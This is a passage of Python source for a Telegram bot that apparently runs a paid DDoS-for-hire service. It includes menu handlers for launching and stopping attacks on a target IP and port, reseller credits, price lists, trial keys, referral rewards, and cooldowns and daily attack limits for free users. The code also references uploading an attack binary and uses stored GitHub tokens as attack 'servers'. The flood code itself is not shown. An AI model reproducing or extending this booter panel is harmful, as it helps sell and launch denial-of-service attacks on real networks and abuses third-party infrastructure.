        await query.message.reply_text(f"{bold('𝐔𝐬𝐞 𝐛𝐮𝐭𝐭𝐨𝐧𝐬 𝐭𝐨 𝐜𝐨𝐧𝐭𝐢𝐧𝐮𝐞')}:", reply_markup=reply_markup)

    elif data.startswith("credits_"):
        credits = int(data.split("_")[1])

        if user_id not in temp_data:
            await query.message.edit_text(f"❌ {bold('𝐒𝐄𝐒𝐒𝐈𝐎𝐍 𝐄𝐗𝐏𝐈𝐑𝐄𝐃')}\n{bold('𝐏𝐥𝐞𝐚𝐬𝐞 𝐬𝐭𝐚𝐫𝐭 𝐚𝐠𝐚𝐢𝐧')}.\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")
            return

        temp_data[user_id]["credits"] = credits
        temp_data[user_id]["step"] = "reseller_add_username"

        reply_markup = get_cancel_keyboard()
        await query.message.edit_text(
            f"💰 {bold('𝐀𝐃𝐃 𝐑𝐄𝐒𝐄𝐋𝐋𝐄𝐑')} - {bold('𝐒𝐓𝐄𝐏 𝟑/𝟑')}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"✓ {bold('𝐔𝐬𝐞𝐫 𝐈𝐃')}: `{temp_data[user_id]['reseller_id']}`\n"
            f"✓ {bold('𝐂𝐫𝐞𝐝𝐢𝐭𝐬')}: `{credits}`\n\n"
            f"{bold('𝐒𝐞𝐧𝐝 𝐭𝐡𝐞 𝐮𝐬𝐞𝐫𝐧𝐚𝐦𝐞')}:\n\n"
            f"{bold('𝐄𝐱𝐚𝐦𝐩𝐥𝐞')}: `john`"
        )
        await query.message.reply_text(f"{bold('𝐓𝐲𝐩𝐞 𝐮𝐬𝐞𝐫𝐧𝐚𝐦𝐞')}:", reply_markup=reply_markup)

# ==================== BUTTON PRESS HANDLER (FIXED) ====================
async def handle_button_press(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text

    clean_text = text.replace('𝐀', 'A').replace('𝐁', 'B').replace('𝐂', 'C').replace('𝐃', 'D').replace('𝐄', 'E').replace('𝐅', 'F').replace('𝐆', 'G').replace('𝐇', 'H').replace('𝐈', 'I').replace('𝐉', 'J').replace('𝐊', 'K').replace('𝐋', 'L').replace('𝐌', 'M').replace('𝐍', 'N').replace('𝐎', 'O').replace('𝐏', 'P').replace('𝐐', 'Q').replace('𝐑', 'R').replace('𝐒', 'S').replace('𝐓', 'T').replace('𝐔', 'U').replace('𝐕', 'V').replace('𝐖', 'W').replace('𝐗', 'X').replace('𝐘', 'Y').replace('𝐙', 'Z')
    clean_text = clean_text.replace('𝟎', '0').replace('𝟏', '1').replace('𝟐', '2').replace('𝟑', '3').replace('𝟒', '4').replace('𝟓', '5').replace('𝟔', '6').replace('𝟕', '7').replace('𝟖', '8').replace('𝟗', '9')

    if "𝐅𝐋𝐀𝐌𝐄 𝐒𝐄𝐑𝐕𝐄𝐑" in text or clean_text == "FLAME SERVER":
        await select_server(update, user_id, "FLAME")
    elif "𝐓𝐀𝐍𝐌𝐀𝐘 𝐒𝐄𝐑𝐕𝐄𝐑" in text or clean_text == "TANMAY SERVER":
        await select_server(update, user_id, "TANMAY")
    elif "𝐍𝐄𝐎 𝐒𝐄𝐑𝐕𝐄𝐑" in text or clean_text == "NEO SERVER":
        await select_server(update, user_id, "NEO")
    elif "𝐅𝐑𝐄𝐄 𝐔𝐒𝐄𝐑" in text or clean_text == "FREE USER":
        await select_free_user(update, context, user_id)
    elif "« 𝐁𝐚𝐜𝐤 𝐭𝐨 𝐌𝐚𝐢𝐧 𝐌𝐞𝐧𝐮" in text or clean_text == "« Back to Main Menu":
        await show_main_menu(update, user_id)
    elif "🎯 𝐋𝐚𝐮𝐧𝐜𝐡 𝐀𝐭𝐭𝐚𝐜𝐤" in text or clean_text == "🎯 Launch Attack":
        await launch_attack_start(update, context, user_id)
    elif "📊 𝐂𝐡𝐞𝐜𝐤 𝐒𝐭𝐚𝐭𝐮𝐬" in text or clean_text == "📊 Check Status":
        await check_status(update, user_id)
    elif "🛑 𝐒𝐭𝐨𝐩 𝐀𝐭𝐭𝐚𝐜𝐤" in text or clean_text == "🛑 Stop Attack":
        await stop_attack_handler(update, context, user_id)
    elif "🔐 𝐌𝐲 𝐀𝐜𝐜𝐞𝐬𝐬" in text or clean_text == "🔐 My Access":
        await my_access(update, user_id)
    elif "🎟️ 𝐑𝐞𝐝𝐞𝐞𝐦 𝐊𝐞𝐲" in text or clean_text == "🎟️ Redeem Key":
        await redeem_key_start(update, user_id)
    elif "👥 𝐔𝐬𝐞𝐫 𝐌𝐚𝐧𝐚𝐠𝐞𝐦𝐞𝐧𝐭" in text or clean_text == "👥 User Management":
        await show_user_management(update, user_id)
    elif "➕ 𝐀𝐝𝐝 𝐔𝐬𝐞𝐫" in text or clean_text == "➕ Add User":
        await add_user_start(update, user_id)
    elif "➖ 𝐑𝐞𝐦𝐨𝐯𝐞 𝐔𝐬𝐞𝐫" in text or clean_text == "➖ Remove User":
        await remove_user_start(update, user_id)
    elif "📋 𝐔𝐬𝐞𝐫𝐬 𝐋𝐢𝐬𝐭" in text or clean_text == "📋 Users List":
        await users_list(update, user_id)
    elif "⏳ 𝐏𝐞𝐧𝐝𝐢𝐧𝐠 𝐑𝐞𝐪𝐮𝐞𝐬𝐭𝐬" in text or clean_text == "⏳ Pending Requests":
        await pending_requests(update, user_id)
    elif "🔑 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞 𝐓𝐫𝐢𝐚𝐥 𝐊𝐞𝐲" in text or clean_text == "🔑 Generate Trial Key":
        await gen_trial_key_start(update, user_id)
    elif "💰 𝐏𝐫𝐢𝐜𝐞 𝐋𝐢𝐬𝐭" in text or clean_text == "💰 Price List":
        await price_list(update)
    elif "⚙️ 𝐁𝐨𝐭 𝐒𝐞𝐭𝐭𝐢𝐧𝐠𝐬" in text or clean_text == "⚙️ Bot Settings":
        await show_bot_settings(update, user_id)
    elif "🔧 𝐓𝐨𝐠𝐠𝐥𝐞 𝐌𝐚𝐢𝐧𝐭𝐞𝐧𝐚𝐧𝐜𝐞" in text or clean_text == "🔧 Toggle Maintenance":
        await toggle_maintenance(update, user_id)
    elif "⏱️ 𝐒𝐞𝐭 𝐂𝐨𝐨𝐥𝐝𝐨𝐰𝐧" in text or clean_text == "⏱️ Set Cooldown":
        await set_cooldown_start(update, user_id)
    elif "📋 𝐀𝐝𝐦𝐢𝐧 𝐋𝐢𝐬𝐭" in text or clean_text == "📋 Admin List":
        await admin_list(update, user_id)
    elif "👑 𝐎𝐰𝐧𝐞𝐫 𝐏𝐚𝐧𝐞𝐥" in text or clean_text == "👑 Owner Panel":
        await show_owner_panel(update, user_id)
    elif "👑 𝐀𝐝𝐝 𝐎𝐰𝐧𝐞𝐫" in text or clean_text == "👑 Add Owner":
        await add_owner_start(update, user_id)
    elif "🗑️ 𝐑𝐞𝐦𝐨𝐯𝐞 𝐎𝐰𝐧𝐞𝐫" in text or clean_text == "🗑️ Remove Owner":
        await remove_owner_start(update, user_id)
    elif "💰 𝐀𝐝𝐝 𝐑𝐞𝐬𝐞𝐥𝐥𝐞𝐫" in text or clean_text == "💰 Add Reseller":
        await add_reseller_start(update, user_id)
    elif "🗑️ 𝐑𝐞𝐦𝐨𝐯𝐞 𝐑𝐞𝐬𝐞𝐥𝐥𝐞𝐫" in text or clean_text == "🗑️ Remove Reseller":
        await remove_reseller_start(update, user_id)
    elif "📋 𝐎𝐰𝐧𝐞𝐫𝐬 𝐋𝐢𝐬𝐭" in text or clean_text == "📋 Owners List":
        await owner_list(update, user_id)
    elif "💰 𝐑𝐞𝐬𝐞𝐥𝐥𝐞𝐫𝐬 𝐋𝐢𝐬𝐭" in text or clean_text == "💰 Resellers List":
        await reseller_list(update, user_id)
    elif "📢 𝐁𝐫𝐨𝐚𝐝𝐜𝐚𝐬𝐭" in text or clean_text == "📢 Broadcast":
        await broadcast_start(update, user_id)
    elif "📤 𝐔𝐩𝐥𝐨𝐚𝐝 𝐁𝐢𝐧𝐚𝐫𝐲" in text or clean_text == "📤 Upload Binary":
        await upload_binary_start(update, user_id)
    elif "➕ 𝐀𝐝𝐝 𝐑𝐞𝐬𝐞𝐥𝐥𝐞𝐫 𝐂𝐫𝐞𝐝𝐢𝐭𝐬" in text or clean_text == "➕ Add Reseller Credits":
        await add_reseller_credits_start(update, user_id)
    elif "📊 𝐑𝐞𝐬𝐞𝐥𝐥𝐞𝐫 𝐒𝐭𝐚𝐭𝐬" in text or clean_text == "📊 Reseller Stats":
        await reseller_stats(update, user_id)
    elif "💰 𝐏𝐫𝐢𝐜𝐞 𝐌𝐚𝐧𝐚𝐠𝐞𝐦𝐞𝐧𝐭" in text or clean_text == "💰 Price Management":
        await show_price_management(update, user_id)
    elif "👤 𝐔𝐬𝐞𝐫 𝐏𝐫𝐢𝐜𝐞𝐬" in text or clean_text == "👤 User Prices":
        await edit_user_prices(update, user_id)
    elif "💰 𝐑𝐞𝐬𝐞𝐥𝐥𝐞𝐫 𝐏𝐫𝐢𝐜𝐞𝐬" in text or clean_text == "💰 Reseller Prices":
        await edit_reseller_prices(update, user_id)
    elif "🆓 𝐅𝐫𝐞𝐞 𝐂𝐨𝐧𝐭𝐫𝐨𝐥𝐬" in text or clean_text == "🆓 Free Controls":
        await show_free_controls(update, user_id)
    elif "⏱️ 𝐒𝐞𝐭 𝐌𝐚𝐱 𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧" in text or clean_text == "⏱️ Set Max Duration":
        await set_free_duration_start(update, user_id)
    elif "🔄 𝐒𝐞𝐭 𝐂𝐨𝐨𝐥𝐝𝐨𝐰𝐧" in text and "𝐅𝐫𝐞𝐞" in text:
        await set_free_cooldown_start(update, user_id)
    elif "📊 𝐒𝐞𝐭 𝐃𝐚𝐢𝐥𝐲 𝐋𝐢𝐦𝐢𝐭" in text or clean_text == "📊 Set Daily Limit":
        await set_free_limit_start(update, user_id)
    elif "👥 𝐒𝐞𝐭 𝐅𝐫𝐞𝐞 𝐆𝐫𝐨𝐮𝐩 𝐈𝐃" in text or clean_text == "👥 Set Free Group ID":
        await set_free_group_id_start(update, user_id)
    elif "💬 𝐓𝐨𝐠𝐠𝐥𝐞 𝐅𝐞𝐞𝐝𝐛𝐚𝐜𝐤" in text or clean_text == "💬 Toggle Feedback":
        await toggle_free_feedback(update, user_id)
    elif "📊 𝐅𝐫𝐞𝐞 𝐒𝐭𝐚𝐭𝐬" in text or clean_text == "📊 Free Stats":
        await free_stats(update, user_id)
    elif "🔗 𝐋𝐢𝐧𝐤 𝐒𝐞𝐭𝐭𝐢𝐧𝐠𝐬" in text or clean_text == "🔗 Link Settings":
        await show_link_settings(update, user_id)
    elif "🔒 𝐒𝐞𝐭 𝐏𝐫𝐢𝐯𝐚𝐭𝐞 𝐂𝐡𝐚𝐧𝐧𝐞𝐥 𝐋𝐢𝐧𝐤" in text or clean_text == "🔒 Set Private Channel Link":
        await set_private_link_start(update, user_id)
    elif "🌍 𝐒𝐞𝐭 𝐏𝐮𝐛𝐥𝐢𝐜 𝐂𝐡𝐚𝐧𝐧𝐞𝐥 𝐋𝐢𝐧𝐤" in text or clean_text == "🌍 Set Public Channel Link":
        await set_public_link_start(update, user_id)
    elif "👥 𝐒𝐞𝐭 𝐅𝐫𝐞𝐞 𝐆𝐫𝐨𝐮𝐩 𝐋𝐢𝐧𝐤" in text or clean_text == "👥 Set Free Group Link":
        await set_free_group_link_start(update, user_id)
    elif "🆔 𝐒𝐞𝐭 𝐅𝐫𝐞𝐞 𝐆𝐫𝐨𝐮𝐩 𝐈𝐃" in text and "𝐋𝐢𝐧𝐤" in text:
        await set_free_group_id_link_start(update, user_id)
    elif "✅ 𝐓𝐞𝐬𝐭 𝐀𝐥𝐥 𝐋𝐢𝐧𝐤𝐬" in text or clean_text == "✅ Test All Links":
        await test_all_links(update, context, user_id)
    elif "📊 𝐕𝐢𝐞𝐰 𝐋𝐢𝐧𝐤𝐬" in text or clean_text == "📊 View Links":
        await view_links(update, user_id)
    elif "🔑 𝐓𝐨𝐤𝐞𝐧 𝐌𝐚𝐧𝐚𝐠𝐞𝐦𝐞𝐧𝐭" in text or clean_text == "🔑 Token Management":
        await show_token_management(update, user_id)
    elif "➕ 𝐀𝐝𝐝 𝐓𝐨𝐤𝐞𝐧" in text or clean_text == "➕ Add Token":
        await add_token_start(update, user_id)
    elif "📋 𝐋𝐢𝐬𝐭 𝐓𝐨𝐤𝐞𝐧𝐬" in text or clean_text == "📋 List Tokens":
        await list_tokens(update, user_id)
    elif "🗑️ 𝐑𝐞𝐦𝐨𝐯𝐞 𝐓𝐨𝐤𝐞𝐧" in text or clean_text == "🗑️ Remove Token":
        await remove_token_start(update, user_id)
    elif "🧹 𝐑𝐞𝐦𝐨𝐯𝐞 𝐄𝐱𝐩𝐢𝐫𝐞𝐝" in text or clean_text == "🧹 Remove Expired":
        await remove_expired_tokens(update, user_id)
    elif "❓ 𝐇𝐞𝐥𝐩" in text or clean_text == "❓ Help":
        await help_handler(update, user_id)
    elif "❌ 𝐂𝐚𝐧𝐜𝐞𝐥" in text or clean_text == "❌ Cancel":
        if user_id in temp_data:
            del temp_data[user_id]
        reply_markup = get_main_keyboard(user_id)
        await update.message.reply_text(f"❌ {bold('𝐎𝐏𝐄𝐑𝐀𝐓𝐈𝐎𝐍 𝐂𝐀𝐍𝐂𝐄𝐋𝐋𝐄𝐃')}\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}", reply_markup=reply_markup)
    else:
        await handle_text_input(update, context, user_id, text)

# ==================== SERVER SELECTION FUNCTIONS ====================
async def select_server(update: Update, user_id, server):
    """Handle server selection for paid users"""
    user_id_str = str(user_id)
    user_server[user_id_str] = server
    
    if not is_approved_user(user_id):
        pending_users.append({
            "user_id": user_id,
            "username": update.effective_user.username or f"user_{user_id}",
            "request_date": time.strftime("%Y-%m-%d %H:%M:%S"),
            "server": server
        })
        save_pending_users(pending_users)
        
        for owner_id in owners.keys():
            try:
                await context.bot.send_message(
                    chat_id=int(owner_id),
                    text=f"📥 {bold('𝐍𝐄𝐖 𝐀𝐂𝐂𝐄𝐒𝐒 𝐑𝐄𝐐𝐔𝐄𝐒𝐓')}\n"
                         f"━━━━━━━━━━━━━━━━━━━━━━\n"
                         f"{bold('𝐔𝐬𝐞𝐫')}: @{update.effective_user.username or '𝐍𝐨 𝐮𝐬𝐞𝐫𝐧𝐚𝐦𝐞'}\n"
                         f"{bold('𝐈𝐃')}: `{user_id}`\n"
                         f"{bold('𝐒𝐞𝐫𝐯𝐞𝐫')}: {server}\n"
                         f"{bold('𝐔𝐬𝐞 𝐔𝐬𝐞𝐫 𝐌𝐚𝐧𝐚𝐠𝐞𝐦𝐞𝐧𝐭 𝐭𝐨 𝐚𝐩𝐩𝐫𝐨𝐯𝐞')}"
                )
            except:
                pass
        
        await update.message.reply_text(
            f"📋 {bold('𝐀𝐂𝐂𝐄𝐒𝐒 𝐑𝐄𝐐𝐔𝐄𝐒𝐓 𝐒𝐄𝐍𝐓')}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{bold('𝐘𝐨𝐮𝐫 𝐚𝐜𝐜𝐞𝐬𝐬 𝐫𝐞𝐪𝐮𝐞𝐬𝐭 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐬𝐞𝐧𝐭 𝐭𝐨 𝐚𝐝𝐦𝐢𝐧.')}\n"
            f"{bold('𝐏𝐥𝐞𝐚𝐬𝐞 𝐰𝐚𝐢𝐭 𝐟𝐨𝐫 𝐚𝐩𝐩𝐫𝐨𝐯𝐚𝐥.')}\n\n"
            f"{bold('𝐘𝐨𝐮𝐫 𝐔𝐬𝐞𝐫 𝐈𝐃')}: `{user_id}`\n\n"
            f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}"
        )
        return
    
    await show_main_menu(update, user_id)

async def select_free_user(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id):
    """Handle free user selection"""
    user_id_str = str(user_id)
    user_server[user_id_str] = "FREE"
    
    referral_link = f"{links_config['referral']['base_link']}{user_id}"
    
    if user_id_str not in referrals:
        referrals[user_id_str] = {
            "referral_link": referral_link,
            "referred_users": [],
            "keys_generated": 0,
            "completed_referrals": 0
        }
        save_referrals(referrals)
    
    await update.message.reply_text(
        f"🆓 {bold('𝐅𝐑𝐄𝐄 𝐔𝐒𝐄𝐑 𝐀𝐂𝐂𝐄𝐒𝐒')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{bold('𝐓𝐨 𝐠𝐞𝐭 𝐟𝐫𝐞𝐞 𝐚𝐜𝐜𝐞𝐬𝐬, 𝐲𝐨𝐮 𝐧𝐞𝐞𝐝 𝐭𝐨:')}\n\n"
        f"1️⃣ {bold('𝐑𝐞𝐟𝐞𝐫 𝟐 𝐟𝐫𝐢𝐞𝐧𝐝𝐬')}\n"
        f"2️⃣ {bold('𝐓𝐡𝐞𝐲 𝐦𝐮𝐬𝐭 𝐣𝐨𝐢𝐧 𝐨𝐮𝐫 𝐜𝐡𝐚𝐧𝐧𝐞𝐥𝐬')}\n"
        f"3️⃣ {bold('𝐆𝐞𝐭 𝟐-𝐡𝐨𝐮𝐫 𝐭𝐫𝐢𝐚𝐥 𝐤𝐞𝐲')}\n"
        f"4️⃣ {bold('𝐉𝐨𝐢𝐧 𝐟𝐫𝐞𝐞 𝐠𝐫𝐨𝐮𝐩 𝐭𝐨 𝐚𝐭𝐭𝐚𝐜𝐤')}\n\n"
        f"🔗 {bold('𝐘𝐎𝐔𝐑 𝐑𝐄𝐅𝐄𝐑𝐑𝐀𝐋 𝐋𝐈𝐍𝐊')}:\n"
        f"`{referral_link}`\n\n"
        f"📊 {bold('𝐂𝐮𝐫𝐫𝐞𝐧𝐭 𝐫𝐞𝐟𝐞𝐫𝐫𝐚𝐥𝐬')}: 0/2\n\n"
        f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}"
    )

# ==================== MAIN MENU ====================
async def show_main_menu(update: Update, user_id):
    """Show main menu based on user role"""
    user_id_str = str(user_id)
    
    if user_id_str in server_activity and user_server.get(user_id_str) != "FREE":
        last_attack = server_activity[user_id_str].get('last_attack', 0)
        if time.time() - last_attack > 3600:
            await update.message.reply_text(
                f"⚠️ {bold('𝐀𝐑𝐄 𝐘𝐎𝐔 𝐀 𝐅𝐑𝐄𝐄 𝐔𝐒𝐄𝐑')}?\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"{bold('𝐘𝐨𝐮 𝐡𝐚𝐯𝐞𝐧𝐭 𝐚𝐭𝐭𝐚𝐜𝐤𝐞𝐝 𝐢𝐧 𝟏 𝐡𝐨𝐮𝐫')}.\n"
                f"{bold('𝐏𝐥𝐞𝐚𝐬𝐞 𝐬𝐞𝐥𝐞𝐜𝐭 𝐅𝐑𝐄𝐄 𝐬𝐞𝐫𝐯𝐞𝐫 𝐢𝐟 𝐲𝐨𝐮𝐫𝐞 𝐚 𝐟𝐫𝐞𝐞𝐮𝐬𝐞𝐫')}."
            )
    
    if is_owner(user_id):
        if is_primary_owner(user_id):
            user_role = "👑 𝐏𝐑𝐈𝐌𝐀𝐑𝐘 𝐎𝐖𝐍𝐄𝐑"
        else:
            user_role = "👑 𝐎𝐖𝐍𝐄𝐑"
    elif is_admin(user_id):
        user_role = "🛡️ 𝐀𝐃𝐌𝐈𝐍"
    elif is_reseller(user_id):
        reseller_data = resellers.get(str(user_id), {})
        credits = reseller_data.get('credits', 0)
        user_role = f"💰 𝐑𝐄𝐒𝐄𝐋𝐋𝐄𝐑 (𝐂𝐫𝐞𝐝𝐢𝐭𝐬: {credits})"
    elif is_approved_user(user_id):
        server = user_server.get(user_id_str, "𝐔𝐍𝐊𝐍𝐎𝐖𝐍")
        user_role = f"👤 {bold(server)} 𝐔𝐒𝐄𝐑"
    else:
        user_role = "🆓 𝐅𝐑𝐄𝐄 𝐔𝐒𝐄𝐑"

    attack_status = get_attack_status()
    status_text = ""

    if attack_status["status"] == "running":
        attack = attack_status["attack"]
        status_text = f"\n\n🔥 {bold('𝐀𝐂𝐓𝐈𝐕𝐄 𝐀𝐓𝐓𝐀𝐂𝐊')}\n{bold('𝐓𝐚𝐫𝐠𝐞𝐭')}: `{attack['ip']}:{attack['port']}`\n{bold('𝐑𝐞𝐦𝐚𝐢𝐧𝐢𝐧𝐠')}: `{attack_status['remaining']}s`"
    elif attack_status["status"] == "cooldown":
        status_text = f"\n\n⏳ {bold('𝐂𝐎𝐎𝐋𝐃𝐎𝐖𝐍')}: `{attack_status['remaining_cooldown']}s`"

    message = (
        f"🤖 {bold('𝐌𝐀𝐈𝐍 𝐌𝐄𝐍𝐔')} 🤖\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{user_role}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"📊 {bold('𝐒𝐭𝐚𝐭𝐮𝐬')}: {'🟢 𝐑𝐞𝐚𝐝𝐲' if attack_status['status'] == 'ready' else '🔴 𝐁𝐮𝐬𝐲'}"
        f"{status_text}\n\n"
        f"{bold('𝐔𝐬𝐞 𝐭𝐡𝐞 𝐛𝐮𝐭𝐭𝐨𝐧𝐬 𝐛𝐞𝐥𝐨𝐰')}:\n\n"
        f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}"
    )

    reply_markup = get_main_keyboard(user_id)
    await update.message.reply_text(message, reply_markup=reply_markup)

# ==================== ATTACK FUNCTIONS ====================
async def launch_attack_start(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id):
    """Start attack process"""
    user_id_str = str(user_id)
    
    if is_free_user(user_id):
        await update.message.reply_text(
            f"⛔ {bold('𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃')}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{bold('𝐅𝐫𝐞𝐞 𝐮𝐬𝐞𝐫𝐬 𝐜𝐚𝐧𝐧𝐨𝐭 𝐚𝐭𝐭𝐚𝐜𝐤 𝐢𝐧 𝐃𝐌')}!\n\n"
            f"{bold('𝐏𝐥𝐞𝐚𝐬𝐞 𝐣𝐨𝐢𝐧 𝐭𝐡𝐞 𝐅𝐑𝐄𝐄 𝐆𝐑𝐎𝐔𝐏 𝐭𝐨 𝐚𝐭𝐭𝐚𝐜𝐤')}:\n"
            f"{links_config['free_group']['link']}\n\n"
            f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}"
        )
        return
    
    if not can_user_attack(user_id):
        await update.message.reply_text(f"⚠️ {bold('𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃')}\n{bold('𝐘𝐨𝐮 𝐚𝐫𝐞 𝐧𝐨𝐭 𝐚𝐮𝐭𝐡𝐨𝐫𝐢𝐳𝐞𝐝 𝐭𝐨 𝐚𝐭𝐭𝐚𝐜𝐤')}.\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")
        return

    if user_id_str in user_feedback_status and user_feedback_status[user_id_str].get("pending"):
        await update.message.reply_text(
            f"⚠️ {bold('𝐅𝐄𝐄𝐃𝐁𝐀𝐂𝐊 𝐑𝐄𝐐𝐔𝐈𝐑𝐄𝐃')}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{bold('𝐘𝐨𝐮 𝐦𝐮𝐬𝐭 𝐬𝐮𝐛𝐦𝐢𝐭 𝐟𝐞𝐞𝐝𝐛𝐚𝐜𝐤 𝐟𝐫𝐨𝐦 𝐲𝐨𝐮𝐫 𝐥𝐚𝐬𝐭 𝐚𝐭𝐭𝐚𝐜𝐤')}.\n\n"
            f"{bold('𝐏𝐥𝐞𝐚𝐬𝐞 𝐬𝐞𝐧𝐝 𝐲𝐨𝐮𝐫 𝐟𝐞𝐞𝐝𝐛𝐚𝐜𝐤 (𝐭𝐞𝐱𝐭/𝐩𝐡𝐨𝐭𝐨)')}"
        )
        temp_data[user_id] = {"step": WAITING_FOR_FEEDBACK}
        return

    can_start, message = can_start_attack(user_id)
    if not can_start:
        await update.message.reply_text(message)
        return

    if not github_tokens:
        await update.message.reply_text(f"❌ {bold('𝐍𝐎 𝐒𝐄𝐑𝐕𝐄𝐑𝐒 𝐀𝐕𝐀𝐈𝐋𝐀𝐁𝐋𝐄')}\n{bold('𝐍𝐨 𝐬𝐞𝐫𝐯𝐞𝐫𝐬 𝐚𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞. 𝐂𝐨𝐧𝐭𝐚𝐜𝐭 𝐚𝐝𝐦𝐢𝐧')}.\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")
        return

    temp_data[user_id] = {"step": "attack_ip", "server": user_server.get(user_id_str, "𝐔𝐍𝐊𝐍𝐎𝐖𝐍")}
    reply_markup = get_cancel_keyboard()
    await update.message.reply_text(
        f"🎯 {bold('𝐋𝐀𝐔𝐍𝐂𝐇 𝐀𝐓𝐓𝐀𝐂𝐊')} - {bold('𝐒𝐓𝐄𝐏 𝟏/𝟑')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{bold('𝐏𝐥𝐞𝐚𝐬𝐞 𝐬𝐞𝐧𝐝 𝐭𝐡𝐞 𝐭𝐚𝐫𝐠𝐞𝐭 𝐈𝐏 𝐚𝐝𝐝𝐫𝐞𝐬𝐬')}:\n\n"
        f"{bold('𝐄𝐱𝐚𝐦𝐩𝐥𝐞')}: `192.168.1.1`\n\n"
        f"⚠️ {bold('𝐈𝐏𝐬 𝐬𝐭𝐚𝐫𝐭𝐢𝐧𝐠 𝐰𝐢𝐭𝐡')} '15' {bold('𝐨𝐫')} '96' {bold('𝐚𝐫𝐞 𝐧𝐨𝐭 𝐚𝐥𝐥𝐨𝐰𝐞𝐝')}\n\n"
        f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}",
        reply_markup=reply_markup
    )

async def handle_free_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle attack in free group"""
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    user_id_str = str(user_id)
    
    if chat_id != free_settings["free_group_id"]:
        return
    
    if not is_approved_user(user_id) and user_id_str not in free_user_attack_counts:
        await update.message.reply_text(
            f"⛔ {bold('𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃')}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{bold('𝐘𝐨𝐮 𝐝𝐨𝐧𝐭 𝐡𝐚𝐯𝐞 𝐚 𝐯𝐚𝐥𝐢𝐝 𝐤𝐞𝐲')}.\n\n"
            f"{bold('𝐆𝐞𝐭 𝐚 𝐤𝐞𝐲 𝐛𝐲 𝐫𝐞𝐟𝐞𝐫𝐫𝐢𝐧𝐠 𝟐 𝐟𝐫𝐢𝐞𝐧𝐝𝐬')}!"
        )
        return
    
    last_attack = free_user_last_attack.get(user_id_str, 0)
    if time.time() - last_attack < free_settings["cooldown"]:
        remaining = int(free_settings["cooldown"] - (time.time() - last_attack))
        await update.message.reply_text(
            f"⏳ {bold('𝐂𝐎𝐎𝐋𝐃𝐎𝐖𝐍')}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{bold('𝐏𝐥𝐞𝐚𝐬𝐞 𝐰𝐚𝐢𝐭')} {bold(str(remaining))} {bold('𝐬𝐞𝐜𝐨𝐧𝐝𝐬')}."
        )
        return
    
    today = time.strftime("%Y-%m-%d")
    if user_id_str not in free_user_attack_counts:
        free_user_attack_counts[user_id_str] = {}
    if today not in free_user_attack_counts[user_id_str]:
        free_user_attack_counts[user_id_str][today] = 0
    
    if free_user_attack_counts[user_id_str][today] >= free_settings["max_attacks_per_day"]:
        await update.message.reply_text(
            f"⚠️ {bold('𝐃𝐀𝐈𝐋𝐘 𝐋𝐈𝐌𝐈𝐓 𝐑𝐄𝐀𝐂𝐇𝐄𝐃')}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{bold('𝐘𝐨𝐮 𝐡𝐚𝐯𝐞 𝐫𝐞𝐚𝐜𝐡𝐞𝐝 𝐲𝐨𝐮𝐫 𝐝𝐚𝐢𝐥𝐲 𝐚𝐭𝐭𝐚𝐜𝐤 𝐥𝐢𝐦𝐢𝐭')}.\n"
            f"{bold('𝐂𝐨𝐦𝐞 𝐛𝐚𝐜𝐤 𝐭𝐨𝐦𝐨𝐫𝐫𝐨𝐰')}!"
        )
        return
    
    if free_settings["feedback_required"] and user_id_str in user_feedback_status and user_feedback_status[user_id_str].get("pending"):
        await update.message.reply_text(
            f"⚠️ {bold('𝐅𝐄𝐄𝐃𝐁𝐀𝐂𝐊 𝐑𝐄𝐐𝐔𝐈𝐑𝐄𝐃')}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{bold('𝐏𝐥𝐞𝐚𝐬𝐞 𝐬𝐮𝐛𝐦𝐢𝐭 𝐟𝐞𝐞𝐝𝐛𝐚𝐜𝐤 𝐟𝐫𝐨𝐦 𝐲𝐨𝐮𝐫 𝐥𝐚𝐬𝐭 𝐚𝐭𝐭𝐚𝐜𝐤')}."
        )
        temp_data[user_id] = {"step": WAITING_FOR_FEEDBACK}
        return
    
    text = update.message.text
    parts = text.split()
    if len(parts) != 4:
        await update.message.reply_text(
            f"❌ {bold('𝐈𝐍𝐕𝐀𝐋𝐈𝐃 𝐅𝐎𝐑𝐌𝐀𝐓')}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
